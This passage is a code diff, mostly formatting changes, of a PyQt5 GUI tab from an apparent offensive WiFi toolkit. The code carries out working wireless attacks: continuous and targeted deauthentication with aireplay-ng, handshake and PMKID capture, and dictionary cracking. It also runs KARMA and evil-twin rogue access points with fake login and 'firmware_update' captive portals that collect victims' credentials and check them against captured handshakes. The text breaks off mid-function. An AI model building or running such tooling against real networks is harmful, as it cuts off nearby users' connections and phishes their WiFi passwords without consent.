@@ -4,10 +4,27 @@ JAMES WiFi Arsenal Tab — Unified Recon + Cracker + KARMA.
 
 from pathlib import Path
 from PyQt5.QtWidgets import (
-    QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QLabel, QComboBox,
-    QGroupBox, QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog,
-    QSpinBox, QMessageBox, QAbstractItemView, QSplitter, QMenu, QLineEdit,
-    QPlainTextEdit, QProgressBar, QFrame, QTabWidget
+    QWidget,
+    QVBoxLayout,
+    QHBoxLayout,
+    QPushButton,
+    QLabel,
+    QComboBox,
+    QGroupBox,
+    QTableWidget,
+    QTableWidgetItem,
+    QHeaderView,
+    QFileDialog,
+    QSpinBox,
+    QMessageBox,
+    QAbstractItemView,
+    QSplitter,
+    QMenu,
+    QLineEdit,
+    QPlainTextEdit,
+    QProgressBar,
+    QFrame,
+    QTabWidget,
 )
 from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QPoint, QThread
 from PyQt5.QtGui import QColor, QFont
@@ -22,6 +39,7 @@ from james.gui.utils.worker import WorkerThread
 
 logger = logging.getLogger(__name__)
 
+
 # Re-use AutoKarmaWorker from previous implementation, but modified to fit the new unified tab
 class AutoKarmaWorker(QThread):
     log_signal = pyqtSignal(str)
@@ -31,8 +49,14 @@ class AutoKarmaWorker(QThread):
 
     TOTAL_PHASES = 5
 
-    def __init__(self, orchestrator, probe_duration=30, ssid="Free_WiFi",
-                 portal="wifi_login", monitor_duration=300):
+    def __init__(
+        self,
+        orchestrator,
+        probe_duration=30,
+        ssid="Free_WiFi",
+        portal="wifi_login",
+        monitor_duration=300,
+    ):
         super().__init__()
         self.orchestrator = orchestrator
         self.pineap = orchestrator.pineap
@@ -90,7 +114,8 @@ class AutoKarmaWorker(QThread):
             return
 
         self._log(f"✅ Selected interface: {target_iface}")
-        if self._aborted(): return self.finished_signal.emit(False)
+        if self._aborted():
+            return self.finished_signal.emit(False)
 
         # 2. Probe Harvest
         self.phase_signal.emit(2, "Phase 2/5: Probe Harvest")
@@ -100,17 +125,25 @@ class AutoKarmaWorker(QThread):
             self.pineap.harvest_probes(mon_iface, duration=self.probe_duration)
             try:
                 self.orchestrator.stop_monitor(mon_iface)
-            except: pass
+            except:
+                pass
         except Exception as e:
             self._log(f"⚠ Probe harvest failed: {e}")
-            try: self.orchestrator.stop_monitor(self.orchestrator._mon_iface(target_iface))
-            except: pass
+            try:
+                self.orchestrator.stop_monitor(
+                    self.orchestrator._mon_iface(target_iface)
+                )
+            except:
+                pass
 
-        if self._aborted(): return self.finished_signal.emit(False)
+        if self._aborted():
+            return self.finished_signal.emit(False)
 
         # 3. KARMA Launch
         self.phase_signal.emit(3, "Phase 3/5: KARMA + Portal Launch")
-        self._log(f"Launching KARMA AP on {target_iface} with SSID {self.ssid}…")
+        self._log(
+            f"Launching KARMA AP on {target_iface} with SSID {self.ssid}…"
+        )
         try:
             self.pineap.start_karma_with_portal(
                 interface=target_iface, ssid=self.ssid, portal=self.portal
@@ -144,6 +177,7 @@ class AutoKarmaWorker(QThread):
         self._log("✅ Auto-KARMA complete. All services stopped.")
         self.finished_signal.emit(True)
 
+
 class WiFiArsenalTab(QWidget):
     """Unified WiFi recon + cracking + KARMA tab."""
 
@@ -172,11 +206,11 @@ class WiFiArsenalTab(QWidget):
 
         # Tab Widget
         self.tabs = QTabWidget()
-        
+
         self.tabs.addTab(self._build_recon_tab(), "📡 Recon & Targeting")
         self.tabs.addTab(self._build_attack_tab(), "🎯 Attack & Crack")
         self.tabs.addTab(self._build_karma_tab(), "👹 Rogue AP (KARMA)")
-        
+
         layout.addWidget(self.tabs)
 
         self.poll_timer = QTimer(self)
@@ -194,7 +228,7 @@ class WiFiArsenalTab(QWidget):
         self.btn_refresh = QPushButton("↻")
         self.btn_refresh.setFixedWidth(32)
         bar.addWidget(self.btn_refresh)
-        
+
         self.btn_hw_info = QPushButton("HW Info")
         bar.addWidget(self.btn_hw_info)
 
@@ -212,7 +246,7 @@ class WiFiArsenalTab(QWidget):
     def _build_recon_tab(self) -> QWidget:
         tab = QWidget()
         layout = QVBoxLayout(tab)
-        
+
         # Scan Control Row
         scan_bar = QHBoxLayout()
         self.btn_start_scan = QPushButton("📡 START FULL SCAN")
@@ -220,14 +254,14 @@ class WiFiArsenalTab(QWidget):
         self.btn_stop_scan = QPushButton("⏹ STOP SCAN")
         self.btn_stop_scan.setMinimumHeight(40)
         self.btn_stop_scan.setEnabled(False)
-        
+
         scan_bar.addWidget(self.btn_start_scan)
         scan_bar.addWidget(self.btn_stop_scan)
-        
+
         self.lbl_stats = QLabel("Stats: Ready")
         scan_bar.addStretch()
         scan_bar.addWidget(self.lbl_stats)
-        
+
         layout.addLayout(scan_bar)
 
         splitter = QSplitter(Qt.Vertical)
@@ -237,8 +271,12 @@ class WiFiArsenalTab(QWidget):
         ap_layout = QVBoxLayout(ap_group)
         self.ap_table = QTableWidget()
         self.ap_table.setColumnCount(6)
-        self.ap_table.setHorizontalHeaderLabels(["BSSID", "ESSID", "CH", "ENC", "PWR", "SIGNAL"])
-        self.ap_table.horizontalHeader().setSectionResizeMode(1, QHeaderView.Stretch)
+        self.ap_table.setHorizontalHeaderLabels(
+            ["BSSID", "ESSID", "CH", "ENC", "PWR", "SIGNAL"]
+        )
+        self.ap_table.horizontalHeader().setSectionResizeMode(
+            1, QHeaderView.Stretch
+        )
         self.ap_table.setSelectionBehavior(QAbstractItemView.SelectRows)
         self.ap_table.setSelectionMode(QAbstractItemView.SingleSelection)
         self.ap_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
@@ -247,12 +285,18 @@ class WiFiArsenalTab(QWidget):
         splitter.addWidget(ap_group)
 
         # Clients table
-        client_group = QGroupBox("CLIENTS / PROBES (Right-click to Targeted Deauth)")
+        client_group = QGroupBox(
+            "CLIENTS / PROBES (Right-click to Targeted Deauth)"
+        )
         client_layout = QVBoxLayout(client_group)
         self.client_table = QTableWidget()
         self.client_table.setColumnCount(4)
-        self.client_table.setHorizontalHeaderLabels(["Client MAC", "Connected AP", "Probes", "PWR"])
-        self.client_table.horizontalHeader().setSectionResizeMode(2, QHeaderView.Stretch)
+        self.client_table.setHorizontalHeaderLabels(
+            ["Client MAC", "Connected AP", "Probes", "PWR"]
+        )
+        self.client_table.horizontalHeader().setSectionResizeMode(
+            2, QHeaderView.Stretch
+        )
         self.client_table.setSelectionBehavior(QAbstractItemView.SelectRows)
         self.client_table.setSelectionMode(QAbstractItemView.SingleSelection)
         self.client_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
@@ -268,7 +312,7 @@ class WiFiArsenalTab(QWidget):
     def _build_attack_tab(self) -> QWidget:
         tab = QWidget()
         layout = QVBoxLayout(tab)
-        
+
         info_group = QGroupBox("Target Information")
         info_layout = QVBoxLayout(info_group)
         self.lbl_target = QLabel("🎯 Selected Target: None")
@@ -303,14 +347,14 @@ class WiFiArsenalTab(QWidget):
 
         crack_group = QGroupBox("3. Dictionary Attack Engine (Manual)")
         crack_layout = QVBoxLayout(crack_group)
-        
+
         file_row = QHBoxLayout()
         file_row.addWidget(QLabel("Capture File:"))
         self.lbl_cap_file = QLabel("None")
         self.btn_browse_cap = QPushButton("📂 Browse...")
         file_row.addWidget(self.lbl_cap_file)
         file_row.addWidget(self.btn_browse_cap)
-        
+
         file_row.addWidget(QLabel("Wordlist:"))
         self.wl_combo = QComboBox()
         self.wl_combo.setMinimumWidth(200)
@@ -338,7 +382,7 @@ class WiFiArsenalTab(QWidget):
         self.lbl_result.setFont(QFont("Arial", 12))
         result_layout.addWidget(self.lbl_result)
         layout.addWidget(result_group)
-        
+
         layout.addStretch()
         return tab
 
@@ -348,17 +392,19 @@ class WiFiArsenalTab(QWidget):
 
         config_group = QGroupBox("Campaign Configuration")
         config_layout = QVBoxLayout(config_group)
-        
+
         set_row = QHBoxLayout()
         set_row.addWidget(QLabel("Evil Twin SSID:"))
         self.txt_ssid = QLineEdit("Free_WiFi")
         set_row.addWidget(self.txt_ssid)
         set_row.addWidget(QLabel("Captive Portal:"))
         self.combo_portal = QComboBox()
-        self.combo_portal.addItems(["wifi_login", "hotel_login", "social_login"])
+        self.combo_portal.addItems(
+            ["wifi_login", "hotel_login", "social_login"]
+        )
         set_row.addWidget(self.combo_portal)
         config_layout.addLayout(set_row)
-        
+
         ctrl_row = QHBoxLayout()
         self.btn_karma_start = QPushButton("👹 START KARMA CAMPAIGN")
         self.btn_karma_start.setMinimumHeight(40)
@@ -386,11 +432,19 @@ class WiFiArsenalTab(QWidget):
 
         tabs = QSplitter(Qt.Horizontal)
         self.karma_clients_tbl = QTableWidget(0, 2)
-        self.karma_clients_tbl.setHorizontalHeaderLabels(["Client IP", "Client MAC"])
-        self.karma_clients_tbl.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        self.karma_clients_tbl.setHorizontalHeaderLabels(
+            ["Client IP", "Client MAC"]
+        )
+        self.karma_clients_tbl.horizontalHeader().setSectionResizeMode(
+            QHeaderView.Stretch
+        )
         self.karma_creds_tbl = QTableWidget(0, 2)
-        self.karma_creds_tbl.setHorizontalHeaderLabels(["Target IP", "Credentials Payload"])
-        self.karma_creds_tbl.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
+        self.karma_creds_tbl.setHorizontalHeaderLabels(
+            ["Target IP", "Credentials Payload"]
+        )
+        self.karma_creds_tbl.horizontalHeader().setSectionResizeMode(
+            QHeaderView.Stretch
+        )
         tabs.addWidget(self.karma_clients_tbl)
         tabs.addWidget(self.karma_creds_tbl)
         dash_layout.addWidget(tabs)
@@ -418,17 +472,21 @@ class WiFiArsenalTab(QWidget):
 
         self.ap_table.itemSelectionChanged.connect(self._on_ap_selected)
         self.ap_table.customContextMenuRequested.connect(self._show_ap_menu)
-        self.client_table.customContextMenuRequested.connect(self._show_client_menu)
+        self.client_table.customContextMenuRequested.connect(
+            self._show_client_menu
+        )
 
         self.btn_capture.clicked.connect(self._capture_handshake)
         self.btn_pmkid.clicked.connect(self._capture_pmkid)
         self.btn_airgeddon.clicked.connect(self._airgeddon_evil_twin)
         self.btn_airgeddon_stop.clicked.connect(self._stop_airgeddon)
-        
+
         self.btn_browse_cap.clicked.connect(self._browse_capture)
         self.btn_browse_wl.clicked.connect(self._browse_wordlist)
-        
-        self.btn_crack_aircrack.clicked.connect(lambda: self._crack("aircrack"))
+
+        self.btn_crack_aircrack.clicked.connect(
+            lambda: self._crack("aircrack")
+        )
         self.btn_crack_hashcat.clicked.connect(lambda: self._crack("hashcat"))
         self.btn_crack_smart.clicked.connect(lambda: self._crack("smart"))
 
@@ -439,51 +497,57 @@ class WiFiArsenalTab(QWidget):
 
     def _show_ap_menu(self, pos: QPoint):
         idx = self.ap_table.indexAt(pos)
-        if not idx.isValid(): return
-        
+        if not idx.isValid():
+            return
+
         row = idx.row()
         bssid = self.ap_table.item(row, 0).text()
         essid = self.ap_table.item(row, 1).text()
-        
+
         menu = QMenu(self)
         clone_action = menu.addAction(f"👹 Clone AP '{essid}' (Evil Twin)")
         clone_action.triggered.connect(lambda: self._clone_ap(essid))
-        
+
         menu.exec_(self.ap_table.viewport().mapToGlobal(pos))
 
     def _show_client_menu(self, pos: QPoint):
         idx = self.client_table.indexAt(pos)
-        if not idx.isValid(): return
-        
+        if not idx.isValid():
+            return
+
         row = idx.row()
         mac = self.client_table.item(row, 0).text()
         bssid = self.client_table.item(row, 1).text()
-        
+
         menu = QMenu(self)
         deauth_single = menu.addAction(f"🔫 Send Deauth Burst to {mac}")
-        deauth_single.triggered.connect(lambda: self._targeted_deauth(mac, bssid, False))
-        
+        deauth_single.triggered.connect(
+            lambda: self._targeted_deauth(mac, bssid, False)
+        )
+
         deauth_cont = menu.addAction(f"🔥 Continuous Deauth (Loop) {mac}")
-        deauth_cont.triggered.connect(lambda: self._targeted_deauth(mac, bssid, True))
-        
+        deauth_cont.triggered.connect(
+            lambda: self._targeted_deauth(mac, bssid, True)
+        )
+
         if self.deauth_proc:
             stop_deauth = menu.addAction("⏹ Stop Continuous Deauth")
             stop_deauth.triggered.connect(self._stop_deauth)
-            
+
         menu.exec_(self.client_table.viewport().mapToGlobal(pos))
 
     # ── Feature Implementations ────────────────────────────────────
-    
+
     def _refresh_interfaces(self):
         self.iface_combo.clear()
         try:
             self.last_audit = self.orchestrator.audit_wifi_hardware()
             for i, ifc in enumerate(self.orchestrator.wifi_interfaces()):
-                name = ifc['interface']
-                mode = ifc.get('mode', '?')
+                name = ifc["interface"]
+                mode = ifc.get("mode", "?")
                 audit = self.last_audit.get(name, {})
                 score = audit.get("score", "orange")
-                
+
                 if score == "green":
                     label = f"{name} ({mode}) ✅"
                     color = QColor(0, 150, 0)
@@ -493,7 +557,7 @@ class WiFiArsenalTab(QWidget):
                 else:
                     label = f"{name} ({mode}) ⚠"
                     color = QColor(200, 100, 0)
-                    
+
                 self.iface_combo.addItem(label, name)
                 self.iface_combo.setItemData(i, color, Qt.ForegroundRole)
         except Exception as e:
@@ -501,25 +565,32 @@ class WiFiArsenalTab(QWidget):
         self._update_iface_status()
 
     def _show_hw_info(self):
-        if not hasattr(self, 'last_audit') or not self.last_audit:
+        if not hasattr(self, "last_audit") or not self.last_audit:
             return show_toast(self.main_window, "No hardware data", "error")
-            
+
         msg = "<b>WiFi Hardware Compatibility Audit</b><br><br>"
         for iface, data in self.last_audit.items():
-            icon = "✅" if data['score'] == 'green' else "❌" if data['score'] == 'red' else "⚠"
+            icon = (
+                "✅"
+                if data["score"] == "green"
+                else "❌" if data["score"] == "red" else "⚠"
+            )
             msg += f"<b>{icon} {iface}</b><br>"
             msg += f"Chipset: {data['chipset']}<br>"
             msg += f"Driver: {data['driver']}<br>"
             msg += f"Monitor Support: {'Yes' if data['monitor_supported'] else 'No'}<br>"
             msg += f"<i>{data['reason']}</i><br><br>"
-            
+
         QMessageBox.information(self, "Hardware Info", msg)
 
     def _update_iface_status(self):
         txt = self.iface_combo.currentText()
-        if "Monitor" in txt: self.lbl_iface_status.setText("● Monitor")
-        elif "Managed" in txt: self.lbl_iface_status.setText("● Managed")
-        else: self.lbl_iface_status.setText("● Unknown")
+        if "Monitor" in txt:
+            self.lbl_iface_status.setText("● Monitor")
+        elif "Managed" in txt:
+            self.lbl_iface_status.setText("● Managed")
+        else:
+            self.lbl_iface_status.setText("● Unknown")
 
     def _enable_monitor(self):
         iface = self.iface_combo.currentData()
@@ -537,13 +608,22 @@ class WiFiArsenalTab(QWidget):
 
     def _start_scan(self):
         iface = self.iface_combo.currentData()
-        if not iface: return show_toast(self.main_window, "No interface selected", "error")
-        
-        try: mon_iface = self.orchestrator.ensure_monitor_mode(iface)
-        except Exception as e: return show_toast(self.main_window, f"Monitor mode error: {e}", "error")
+        if not iface:
+            return show_toast(
+                self.main_window, "No interface selected", "error"
+            )
+
+        try:
+            mon_iface = self.orchestrator.ensure_monitor_mode(iface)
+        except Exception as e:
+            return show_toast(
+                self.main_window, f"Monitor mode error: {e}", "error"
+            )
 
         self.orchestrator.layer.run("rm -f /tmp/james_recon*")
-        self.recon_proc = self.orchestrator.aircrack.start_airodump(mon_iface, write_prefix="/tmp/james_recon")
+        self.recon_proc = self.orchestrator.aircrack.start_airodump(
+            mon_iface, write_prefix="/tmp/james_recon"
+        )
         self.poll_timer.start(3000)
         self.btn_start_scan.setEnabled(False)
         self.btn_stop_scan.setEnabled(True)
@@ -551,49 +631,82 @@ class WiFiArsenalTab(QWidget):
     def _stop_scan(self):
         self.poll_timer.stop()
         if self.recon_proc:
-            try: self.orchestrator.layer.kill_background(self.recon_proc)
-            except: pass
+            try:
+                self.orchestrator.layer.kill_background(self.recon_proc)
+            except:
+                pass
             self.recon_proc = None
         self.btn_start_scan.setEnabled(True)
         self.btn_stop_scan.setEnabled(False)
 
     def _do_poll(self):
         csv_file = "/tmp/james_recon-01.csv"
-        if not os.path.exists(csv_file): return
+        if not os.path.exists(csv_file):
+            return
         try:
             with open(csv_file, "r", encoding="utf-8", errors="ignore") as f:
                 data = self.orchestrator.aircrack.parse_airodump_csv(f.read())
-        except: return
+        except:
+            return
 
-        aps = [a for a in data.get("aps", []) if a.get("bssid", "").count(":") == 5]
+        aps = [
+            a
+            for a in data.get("aps", [])
+            if a.get("bssid", "").count(":") == 5
+        ]
         aps.sort(key=lambda x: x.get("power", -100), reverse=True)
-        self.lbl_stats.setText(f"📡 {len(aps)} APs  |  👤 {len(data.get('stations', []))} Clients")
+        self.lbl_stats.setText(
+            f"📡 {len(aps)} APs  |  👤 {len(data.get('stations', []))} Clients"
+        )
 
         self.ap_table.setRowCount(len(aps))
         for i, ap in enumerate(aps):
             self.ap_table.setItem(i, 0, QTableWidgetItem(ap.get("bssid", "")))
             self.ap_table.setItem(i, 1, QTableWidgetItem(ap.get("essid", "")))
-            self.ap_table.setItem(i, 2, QTableWidgetItem(str(ap.get("channel", ""))))
-            self.ap_table.setItem(i, 3, QTableWidgetItem(ap.get("privacy", "")))
-            self.ap_table.setItem(i, 4, QTableWidgetItem(str(ap.get("power", ""))))
-            self.ap_table.setItem(i, 5, QTableWidgetItem("█" * max(1, min(5, (100 + ap.get("power", -100)) // 10))))
+            self.ap_table.setItem(
+                i, 2, QTableWidgetItem(str(ap.get("channel", "")))
+            )
+            self.ap_table.setItem(
+                i, 3, QTableWidgetItem(ap.get("privacy", ""))
+            )
+            self.ap_table.setItem(
+                i, 4, QTableWidgetItem(str(ap.get("power", "")))
+            )
+            self.ap_table.setItem(
+                i,
+                5,
+                QTableWidgetItem(
+                    "█" * max(1, min(5, (100 + ap.get("power", -100)) // 10))
+                ),
+            )
 
         clients = data.get("stations", [])
         self.client_table.setRowCount(len(clients))
         for i, c in enumerate(clients):
-            self.client_table.setItem(i, 0, QTableWidgetItem(c.get("station_mac", c.get("mac", ""))))
-            self.client_table.setItem(i, 1, QTableWidgetItem(c.get("bssid", "")))
-            self.client_table.setItem(i, 2, QTableWidgetItem(c.get("probes", "")))
-            self.client_table.setItem(i, 3, QTableWidgetItem(str(c.get("power", ""))))
+            self.client_table.setItem(
+                i, 0, QTableWidgetItem(c.get("station_mac", c.get("mac", "")))
+            )
+            self.client_table.setItem(
+                i, 1, QTableWidgetItem(c.get("bssid", ""))
+            )
+            self.client_table.setItem(
+                i, 2, QTableWidgetItem(c.get("probes", ""))
+            )
+            self.client_table.setItem(
+                i, 3, QTableWidgetItem(str(c.get("power", "")))
+            )
 
     def _on_ap_selected(self):
         rows = self.ap_table.selectedItems()
-        if not rows: return
+        if not rows:
+            return
         r = rows[0].row()
         self.selected_bssid = self.ap_table.item(r, 0).text()
         self.selected_essid = self.ap_table.item(r, 1).text()
         self.selected_channel = self.ap_table.item(r, 2).text()
-        self.lbl_target.setText(f"🎯 {self.selected_bssid} · {self.selected_essid}")
+        self.lbl_target.setText(
+            f"🎯 {self.selected_bssid} · {self.selected_essid}"
+        )
         self.btn_capture.setEnabled(True)
         self.btn_pmkid.setEnabled(True)
         self.btn_airgeddon.setEnabled(True)
@@ -601,23 +714,41 @@ class WiFiArsenalTab(QWidget):
     # Targeted Deauth
     def _targeted_deauth(self, client_mac: str, bssid: str, continuous: bool):
         iface = self.iface_combo.currentData()
-        if not iface: return show_toast(self.main_window, "No interface", "error")
-        if not bssid or bssid == '(not associated)': return show_toast(self.main_window, "Client not associated to AP", "error")
-        
+        if not iface:
+            return show_toast(self.main_window, "No interface", "error")
+        if not bssid or bssid == "(not associated)":
+            return show_toast(
+                self.main_window, "Client not associated to AP", "error"
+            )
+
         self.main_window._set_idle(False)
-        try: mon_iface = self.orchestrator.ensure_monitor_mode(iface)
-        except Exception as e: return show_toast(self.main_window, f"Mon mode fail: {e}", "error")
+        try:
+            mon_iface = self.orchestrator.ensure_monitor_mode(iface)
+        except Exception as e:
+            return show_toast(self.main_window, f"Mon mode fail: {e}", "error")
 
         if continuous:
-            show_toast(self.main_window, f"Continuous deauth started for {client_mac}")
+            show_toast(
+                self.main_window, f"Continuous deauth started for {client_mac}"
+            )
             cmd = f"aireplay-ng -0 0 -a {bssid} -c {client_mac} {mon_iface}"
-            self.deauth_proc = self.orchestrator.layer.run_background(cmd, sudo=True)
+            self.deauth_proc = self.orchestrator.layer.run_background(
+                cmd, sudo=True
+            )
         else:
-            show_toast(self.main_window, f"Sending deauth burst to {client_mac}")
+            show_toast(
+                self.main_window, f"Sending deauth burst to {client_mac}"
+            )
+
             def do_deauth():
-                self.orchestrator.aircrack.deauth(mon_iface, bssid, count=10, client=client_mac)
+                self.orchestrator.aircrack.deauth(
+                    mon_iface, bssid, count=10, client=client_mac
+                )
+
             self.worker = WorkerThread(do_deauth)
-            self.worker.finished.connect(lambda _: self.main_window._set_idle(True))
+            self.worker.finished.connect(
+                lambda _: self.main_window._set_idle(True)
+            )
             self.worker.start()
 
     def _stop_deauth(self):
@@ -634,88 +765,131 @@ class WiFiArsenalTab(QWidget):
     # Airgeddon Automated Flow
     def _airgeddon_evil_twin(self):
         iface = self.iface_combo.currentData()
-        bssid, ch, essid = self.selected_bssid, self.selected_channel, self.selected_essid
-        if not iface or not bssid: return
+        bssid, ch, essid = (
+            self.selected_bssid,
+            self.selected_channel,
+            self.selected_essid,
+        )
+        if not iface or not bssid:
+            return
         self._stop_scan()
-        
+
         self.btn_airgeddon.setEnabled(False)
         self.btn_airgeddon_stop.setEnabled(True)
         self.lbl_result.setText("● Starting Airgeddon Evil Twin workflow…")
-        
+
         # We need a dedicated worker reference so we can stop it
         self._airgeddon_active = True
-        
+
         def _do_airgeddon():
             # Step 1: Handshake
-            self.main_window._append_log("[AIRGEDDON] Step 1: Capturing handshake...")
+            self.main_window._append_log(
+                "[AIRGEDDON] Step 1: Capturing handshake..."
+            )
             mon = self.orchestrator.ensure_monitor_mode(iface)
             prefix = f"/tmp/james_cap_{bssid.replace(':','')}"
             self.orchestrator.layer.run(f"rm -f {prefix}*")
-            proc = self.orchestrator.aircrack.start_airodump(mon, channel=int(ch), bssid=bssid, write_prefix=prefix)
-            
+            proc = self.orchestrator.aircrack.start_airodump(
+                mon, channel=int(ch), bssid=bssid, write_prefix=prefix
+            )
+
             client = None
-            clients = [self.client_table.item(i,0).text() for i in range(self.client_table.rowCount()) if self.client_table.item(i,1).text() == bssid]
-            if clients: client = clients[0]
-            
+            clients = [
+                self.client_table.item(i, 0).text()
+                for i in range(self.client_table.rowCount())
+                if self.client_table.item(i, 1).text() == bssid
+            ]
+            if clients:
+                client = clients[0]
+
             cap_file = f"{prefix}-01.cap"
             found = False
             for _ in range(5):
-                if not self._airgeddon_active: break
-                self.orchestrator.aircrack.deauth(mon, bssid, count=10, client=client)
+                if not self._airgeddon_active:
+                    break
+                self.orchestrator.aircrack.deauth(
+                    mon, bssid, count=10, client=client
+                )
                 time.sleep(10)
-                if Path(cap_file).exists() and self.orchestrator.aircrack.check_handshake(cap_file, bssid):
-                    found = True; break
-            
+                if Path(
+                    cap_file
+                ).exists() and self.orchestrator.aircrack.check_handshake(
+                    cap_file, bssid
+                ):
+                    found = True
+                    break
+
             self.orchestrator.layer.kill_background(proc)
-            
+
             if not found:
-                self.main_window._append_log("[AIRGEDDON] Handshake capture failed. Aborting.")
+                self.main_window._append_log(
+                    "[AIRGEDDON] Handshake capture failed. Aborting."
+                )
                 return {"success": False, "msg": "Handshake capture failed"}
-                
-            self.main_window._append_log("[AIRGEDDON] Handshake captured successfully!")
-            
+
+            self.main_window._append_log(
+                "[AIRGEDDON] Handshake captured successfully!"
+            )
+
             # Switch interface back to managed for hostapd (mana needs managed)
-            self.main_window._append_log("[AIRGEDDON] Step 2: Spinning up Evil Twin & Captive Portal...")
+            self.main_window._append_log(
+                "[AIRGEDDON] Step 2: Spinning up Evil Twin & Captive Portal..."
+            )
             self.orchestrator.layer.run(f"airmon-ng stop {mon}", sudo=True)
             managed_iface = iface  # Using the base managed interface name
-            
+
             # Clear creds
             from james.tools.pineap import CREDS_LOG
-            if CREDS_LOG.exists(): CREDS_LOG.unlink()
-            
+
+            if CREDS_LOG.exists():
+                CREDS_LOG.unlink()
+
             self.pineap.stop_all()
             self.pineap.start_karma_with_portal(
                 interface=managed_iface,
                 channel=int(ch),
                 ssid=essid,
                 portal="firmware_update",
-                bssid=bssid
+                bssid=bssid,
             )
-            
+
             # Step 3: Deauth Target Continuous
-            self.main_window._append_log("[AIRGEDDON] Step 3: Continuously deauthing original target...")
+            self.main_window._append_log(
+                "[AIRGEDDON] Step 3: Continuously deauthing original target..."
+            )
             # We need a secondary adapter for continuous deauth ideally, but if we only have one, hostapd holds it.
             # Airgeddon typically requires 2 adapters for the Evil Twin attack (one for AP, one for Deauth).
             # If the user has a second adapter in monitor mode, let's try to use it.
             # For now, we'll try to find any monitor mode adapter for deauth.
             deauth_mon = None
-            for other_iface in [self.iface_combo.itemData(i) for i in range(self.iface_combo.count())]:
+            for other_iface in [
+                self.iface_combo.itemData(i)
+                for i in range(self.iface_combo.count())
+            ]:
                 if other_iface != managed_iface and "mon" in other_iface:
                     deauth_mon = other_iface
                     break
-            
+
             deauth_proc = None
             if deauth_mon:
-                self.main_window._append_log(f"[AIRGEDDON] Using {deauth_mon} for continuous deauth.")
-                deauth_proc = self.orchestrator.layer.run_background(f"aireplay-ng -0 0 -a {bssid} {deauth_mon}", sudo=True)
+                self.main_window._append_log(
+                    f"[AIRGEDDON] Using {deauth_mon} for continuous deauth."
+                )
+                deauth_proc = self.orchestrator.layer.run_background(
+                    f"aireplay-ng -0 0 -a {bssid} {deauth_mon}", sudo=True
+                )
             else:
-                self.main_window._append_log("[AIRGEDDON] WARNING: No secondary monitor interface found for continuous deauth! Target clients may not disconnect.")
+                self.main_window._append_log(
+                    "[AIRGEDDON] WARNING: No secondary monitor interface found for continuous deauth! Target clients may not disconnect."
+                )
 
             # Step 4: Verification Loop
-            self.main_window._append_log("[AIRGEDDON] Step 4: Waiting for credentials and verifying...")
+            self.main_window._append_log(
+                "[AIRGEDDON] Step 4: Waiting for credentials and verifying..."
+            )
             valid_password = None
             verified_creds = set()
-            
+
             while self._airgeddon_active:
                 time.sleep(3)
                 creds = self.pineap.get_creds()
@@ -723,26 +897,30 @@ class WiFiArsenalTab(QWidget):
                     pwd = cred.get("password")
                     if pwd and pwd not in verified_creds:
                         verified_creds.add(pwd)
-                        self.main_window._append_log(f"[AIRGEDDON] Testing submitted password: {pwd}")
-                        
+                        self.main_window._append_log(
+                            f"[AIRGEDDON] Testing submitted password: {pwd}"
+                        )
+
                         # Write to temp dict
                         dict_path = "/tmp/james_airgeddon.txt"
                         Path(dict_path).write_text(pwd + "\\n")
-                        
+
                         # Verify with aircrack
-                        res = self.orchestrator.aircrack.crack(cap_file, dict_path, bssid)
+                        res = self.orchestrator.aircrack.crack(
+                            cap_file, dict_path, bssid
+                        )
                         if res.get("success"):
                             valid_password = pwd
                             break
-                            
+
                 if valid_password:
                     break
-                    
+
             # Cleanup
             self.pineap.stop_all()
             if deauth_proc:
                 self.orchestrator.layer.kill_background(deauth_proc)
-                
+
             if valid_password:
                 return {"success": True, "password": valid_password}
             else:
@@ -760,15 +938,21 @@ class WiFiArsenalTab(QWidget):
     def _on_airgeddon_done(self, res):
         self.btn_airgeddon.setEnabled(True)
         self.btn_airgeddon_stop.setEnabled(False)
-        
+
         if isinstance(res, Exception):
             self.lbl_result.setText(f"● Airgeddon error: {res}")
         elif res.get("success"):
             pwd = res.get("password")
-            self.lbl_result.setStyleSheet("color: #00ff00; font-size: 24px; font-weight: bold;")
+            self.lbl_result.setStyleSheet(
+                "color: #00ff00; font-size: 24px; font-weight: bold;"
+            )
             self.lbl_result.setText(f"PASSWORD FOUND: {pwd}")
-            show_toast(self.main_window, f"Airgeddon Success: {pwd}", "success")
-            self.main_window._append_log(f"\\n\\n{'='*40}\\n[AIRGEDDON] PWNED! Password: {pwd}\\n{'='*40}\\n")
+            show_toast(
+                self.main_window, f"Airgeddon Success: {pwd}", "success"
+            )
+            self.main_window._append_log(
+                f"\\n\\n{'='*40}\\n[AIRGEDDON] PWNED! Password: {pwd}\\n{'='*40}\\n"
+            )
         else:
             self.lbl_result.setText(f"● {res.get('msg', 'Airgeddon aborted')}")
 
@@ -776,30 +960,44 @@ class WiFiArsenalTab(QWidget):
     def _capture_handshake(self):
         iface = self.iface_combo.currentData()
         bssid, ch = self.selected_bssid, self.selected_channel
-        if not iface or not bssid: return
+        if not iface or not bssid:
+            return
         self._stop_scan()
         self.lbl_result.setText("● Capturing handshake…")
-        
+
         def _do_cap():
             mon = self.orchestrator.ensure_monitor_mode(iface)
             prefix = f"/tmp/james_cap_{bssid.replace(':','')}"
             self.orchestrator.layer.run(f"rm -f {prefix}*")
-            proc = self.orchestrator.aircrack.start_airodump(mon, channel=int(ch), bssid=bssid, write_prefix=prefix)
-            
+            proc = self.orchestrator.aircrack.start_airodump(
+                mon, channel=int(ch), bssid=bssid, write_prefix=prefix
+            )
+
             # Find strongest client for targeted deauth instead of broadcast
             client = None
-            clients = [self.client_table.item(i,0).text() for i in range(self.client_table.rowCount()) 
-                       if self.client_table.item(i,1).text() == bssid]
-            if clients: client = clients[0] # taking the first (strongest) one
-            
+            clients = [
+                self.client_table.item(i, 0).text()
+                for i in range(self.client_table.rowCount())
+                if self.client_table.item(i, 1).text() == bssid
+            ]
+            if clients:
+                client = clients[0]  # taking the first (strongest) one
+
             cap_file = f"{prefix}-01.cap"
             found = False
             for _ in range(5):
-                self.orchestrator.aircrack.deauth(mon, bssid, count=10, client=client)
+                self.orchestrator.aircrack.deauth(
+                    mon, bssid, count=10, client=client
+                )
                 time.sleep(10)
-                if Path(cap_file).exists() and self.orchestrator.aircrack.check_handshake(cap_file, bssid):
-                    found = True; break
-            
+                if Path(
+                    cap_file
